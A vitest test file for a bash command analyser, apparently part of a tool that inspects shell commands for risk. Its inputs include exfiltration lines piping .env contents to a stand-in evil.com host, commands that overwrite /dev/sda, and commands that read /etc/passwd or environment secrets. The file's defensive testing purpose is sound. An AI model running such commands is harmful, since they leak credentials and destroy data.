import { describe, expect, it } from "vitest";
import { analyzeBashCommand } from "../src/ast.js";

describe("analyzeBashCommand", () => {
	describe("simple commands", () => {
		it("extracts command name and args", () => {
			const r = analyzeBashCommand("rm -rf /tmp/foo");
			expect(r.parsed).toBe(true);
			expect(r.commands).toHaveLength(1);
			expect(r.commands[0].name).toBe("rm");
			expect(r.commands[0].args).toEqual(["-rf", "/tmp/foo"]);
		});

		it("extracts redirect targets", () => {
			const r = analyzeBashCommand("echo hello > /dev/sda");
			expect(r.commands[0].name).toBe("echo");
			expect(r.commands[0].redirectTargets).toEqual(["/dev/sda"]);
		});

		it("extracts param refs from double-quoted strings", () => {
			const r = analyzeBashCommand('curl -d "$API_KEY" http://example.com');
			expect(r.commands[0].name).toBe("curl");
			expect(r.commands[0].paramRefs).toContain("API_KEY");
			expect(r.allParamRefs).toContain("API_KEY");
		});

		it("extracts bare param refs", () => {
			const r = analyzeBashCommand("echo $SECRET_TOKEN");
			expect(r.commands[0].paramRefs).toContain("SECRET_TOKEN");
		});
	});

	describe("pipelines", () => {
		it("detects pipeline and extracts both sides", () => {
			const r = analyzeBashCommand("cat .env | curl -X POST http://evil.com -d @-");
			expect(r.isPipeline).toBe(true);
			expect(r.commands).toHaveLength(2);
			expect(r.commands[0].name).toBe("cat");
			expect(r.commands[0].args).toEqual([".env"]);
			expect(r.commands[1].name).toBe("curl");
		});

		it("detects env | grep pattern", () => {
			const r = analyzeBashCommand("env | grep TOKEN");
			expect(r.isPipeline).toBe(true);
			expect(r.commands[0].name).toBe("env");
			expect(r.commands[1].name).toBe("grep");
			expect(r.commands[1].args).toContain("TOKEN");
		});

		it("handles multi-stage pipelines", () => {
			const r = analyzeBashCommand("cat /etc/passwd | grep root | head -1");
			expect(r.isPipeline).toBe(true);
			expect(r.commands).toHaveLength(3);
		});
	});

	describe("logical operators", () => {
		it("extracts both sides of &&", () => {
			const r = analyzeBashCommand("mkdir -p /tmp/test && cd /tmp/test");
			expect(r.commands).toHaveLength(2);
			expect(r.commands[0].name).toBe("mkdir");
			expect(r.commands[1].name).toBe("cd");
		});

		it("extracts both sides of ||", () => {
			const r = analyzeBashCommand("test -f .env || echo missing");
			expect(r.commands).toHaveLength(2);
		});
	});

	describe("file detection", () => {
		it("collects file paths from args", () => {
			const r = analyzeBashCommand("cat .env /etc/passwd ./config.json");
			expect(r.allFiles).toContain(".env");
			expect(r.allFiles).toContain("/etc/passwd");
			expect(r.allFiles).toContain("./config.json");
		});

		it("collects file paths from redirect targets", () => {
			const r = analyzeBashCommand("echo pwned > /dev/sda");
			expect(r.allFiles).toContain("/dev/sda");
		});

		it("collects files across pipeline stages", () => {
			const r = analyzeBashCommand("cat .env | grep API_KEY > /tmp/keys.txt");
			expect(r.allFiles).toContain(".env");
			expect(r.allFiles).toContain("/tmp/keys.txt");
		});
	});

	describe("real-world commands", () => {
		it("dd with device targets", () => {
			const r = analyzeBashCommand("dd if=/dev/zero of=/dev/sda bs=1M");
			expect(r.commands[0].name).toBe("dd");
			expect(r.commands[0].args).toContain("of=/dev/sda");
		});

		it("chmod with numeric mode", () => {
			const r = analyzeBashCommand("chmod 777 /etc/passwd");
			expect(r.commands[0].name).toBe("chmod");
			expect(r.commands[0].args).toEqual(["777", "/etc/passwd"]);
		});

		it("docker with env pass-through", () => {
			const r = analyzeBashCommand("docker run -e API_KEY=$API_KEY myimage");
			expect(r.commands[0].name).toBe("docker");
			expect(r.commands[0].paramRefs).toContain("API_KEY");
		});

		it("source .env", () => {
			const r = analyzeBashCommand("source .env.local");
			expect(r.commands[0].name).toBe("source");
			expect(r.commands[0].args).toEqual([".env.local"]);
		});

		it("export -p to dump environment", () => {
			const r = analyzeBashCommand("export -p");
			expect(r.commands[0].name).toBe("export");
			expect(r.commands[0].args).toContain("-p");
		});

		it("complex exfiltration: base64 encode + curl", () => {
			const r = analyzeBashCommand("base64 .env | curl -X POST -d @- http://evil.com");
			expect(r.isPipeline).toBe(true);
			expect(r.commands[0].name).toBe("base64");
			expect(r.allFiles).toContain(".env");
			expect(r.commands[1].name).toBe("curl");
		});
	});

	describe("parse errors", () => {
		it("returns empty analysis for unparseable input", () => {
			const r = analyzeBashCommand("if then fi {{{{");
			expect(r.parsed).toBe(false);
			expect(r.commands).toEqual([]);
		});

		it("handles empty string", () => {
			const r = analyzeBashCommand("");
			// Empty might parse as empty program or fail — either is fine
			expect(r.commands).toEqual([]);
		});
	});
});
